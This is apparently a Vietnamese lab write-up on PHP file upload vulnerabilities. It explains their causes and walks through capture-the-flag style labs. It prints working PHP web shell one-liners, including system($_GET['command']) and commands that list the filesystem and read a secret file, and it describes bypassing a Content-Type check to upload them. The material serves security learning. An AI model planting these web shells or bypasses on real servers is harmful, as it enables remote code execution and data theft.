# Lỗ Hổng Tải Tệp Lên Là Gì ?
- **Lỗ hổng PHP Upload File (PHP File Upload Vulnerability)** là một vấn đề bảo mật nghiêm trọng trong các ứng dụng web.
- Lỗ hổng tải tệp lên là khi máy chủ web cho phép người dùng tải tệp lên hệ thống tệp của mình mà không xác thực đầy đủ các thông tin như tên, loại, nội dung hoặc kích thước,... Không thực thi đúng các hạn chế này có thể có nghĩa là ngay cả một chức năng tải hình ảnh cơ bản cũng có thể được sử dụng để tải lên các tệp tùy ý và có khả năng gây nguy hiểm.
- Điều này thậm chí có thể bao gồm các tệp tập lệnh phía máy chủ cho phép thực thi mã từ xa.
## Nguyễn nhân gây ra lổ hổng 
- **Thiếu kiểm tra loại tệp**: Ứng dụng không kiểm tra phần mở rộng hoặc loại MIME của tệp.
- **Không xác thực nội dung tệp**: Nội dung tệp tải lên có thể chứa mã độc mà không bị phát hiện.
- **Xử lý sai đường dẫn lưu trữ**: Các tệp được lưu ở vị trí không an toàn hoặc cho phép truy cập công khai.
- **Thiếu cơ chế kiểm soát quyền hạn**: Người dùng có thể tải lên tệp và thực thi mã mà không có bất kỳ hạn chế nào.
- **Lỗ hổng kiểm tra logic**: Logic xác thực hoặc lọc tệp không đủ mạnh, dễ bị bypass.
## Các cách khai thác lổ hổng tải tệp lên
### Web shell
- Web shell là một tập lệnh độc hại cho phép kẻ tấn công thực thi các lệnh tùy ý trên máy chủ web từ xa chỉ bằng cách gửi yêu cầu HTTP đến đúng điểm cuối.
- Nếu bạn có thể tải lên thành công một web shell, về cơ bản bạn có toàn quyền kiểm soát máy chủ. Điều này có nghĩa là bạn có thể đọc và ghi các tệp tùy ý, trích xuất dữ liệu nhạy cảm, thậm chí sử dụng máy chủ để tấn công trục vào cả cơ sở hạ tầng nội bộ và các máy chủ khác bên ngoài mạng.
- Ví dụ, có thể sử dụng dòng lệnh PHP sau để đọc các tệp tùy ý từ hệ thống tệp của máy chủ:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Một web shell linh hoạt hơn có thể trông giống như thế này:
```php
<?php echo system($_GET['command']); ?>
```
- Tập lệnh này cho phép bạn truyền lệnh hệ thống tùy ý thông qua tham số truy vấn như sau:
```php
GET /example/exploit.php?command=id HTTP/1.1
```
#### Phòng thí nghiệm: Thực thi mã từ xa thông qua tải lên web shell
##### Mô tả :
- Phòng thí nghiệm này chứa một chức năng tải lên hình ảnh dễ bị tấn công. Nó không thực hiện bất kỳ xác thực nào đối với các tệp mà người dùng tải lên trước khi lưu trữ chúng trên hệ thống tệp của máy chủ.
- Để giải quyết bài lab, hãy tải lên một web shell PHP cơ bản và sử dụng nó để trích xuất nội dung của tệp /home/carlos/secret. Gửi bí mật này bằng nút được cung cấp trong biểu ngữ bài lab.
##### Cách giải :
- Ban đầu ta sẽ upload 1 file.php với nội dung
```php
<?php system('ls / -la'); ?>
```
- Khi web thực thi code của file ta sẽ nhận được raw tương ứng

<img width="1065" alt="Ảnh màn hình 2024-12-06 lúc 21 43 31" src="https://github.com/user-attachments/assets/700e4682-70a3-4743-9662-9ea3b60bb980">

- Do được cung cấp đường dẫn `/home/carlos/secret` nên ta chỉ việc cat đường đó .Và được flag .
```php
<?php system('ls / -la'); ?>
<?php system('cat /home/carlos/secret'); ?>
```
<img width="1057" alt="Ảnh màn hình 2024-12-06 lúc 21 46 27" src="https://github.com/user-attachments/assets/e97240b6-0562-4db5-9888-e862edcfdd69">

### Phòng thí nghiệm: Tải lên web shell thông qua bỏ qua hạn chế Content-Type
#### Mô tả :
- Phòng thí nghiệm này chứa một chức năng tải lên hình ảnh dễ bị tấn công. Nó cố gắng ngăn người dùng tải lên các loại tệp không mong muốn, nhưng dựa vào việc kiểm tra đầu vào do người dùng kiểm soát để xác minh điều này.
- Để giải quyết bài lab, hãy tải lên một web shell PHP cơ bản và sử dụng nó để trích xuất nội dung của tệp /home/carlos/secret. Gửi bí mật này bằng nút được cung cấp trong biểu ngữ bài lab.
#### Cách giải 
- Nếu ta upload file ảnh lên thì web thực hiện file ảnh đó 1 cách bình thường .Nhưng nếu ta upload file bất kì không thuộc dạng file mà web cho phép thì chúng ta sẽ bị báo lỗi vì vậy lỗi này nằm ở Content-Type của POST khi gửi yêu cầu đến máy chủ vì vậy ta chỉ cần repeatẻ và sửa Content-Type thành image/jpeg thì sẽ tìm được flag
<img width="1061" alt="Ảnh màn hình 2024-12-06 lúc 22 36 36" src="https://github.com/user-attachments/assets/69d95499-105b-4192-8dd2-56a742398a2b">

# File_upload_challenges.zip
## level 1 
### Mô tả 

<img width="1438" alt="Ảnh màn hình 2024-12-08 lúc 11 33 23" src="https://github.com/user-attachments/assets/918ca0ee-f0ca-4e77-97cb-9c3d8dae286a">

### Giải pháp 
- Nếu ta upload 1 file bất kì thì chúng ta sẽ không tìm được flag.Vậy hãy thử upload file php thử

<img width="1440" alt="Ảnh màn hình 2024-12-08 lúc 11 35 25" src="https://github.com/user-attachments/assets/bdba2af4-0ed8-47f9-9c77-bafddb448273">

- Tôi sẽ nhận được các tệp được liệt kê khi upload file php.Bây giờ tôi chỉ cần sửa nội dung php để cat ra file `secret.txt` là tôi sẽ tìm được flag

<img width="1440" alt="Ảnh màn hình 2024-12-08 lúc 11 37 19" src="https://github.com/user-attachments/assets/af0e47af-df30-44e1-a738-e3db85ffb2a5">

Flag : `CBJS{FAKE_FLAG_FAKE_FLAG}`
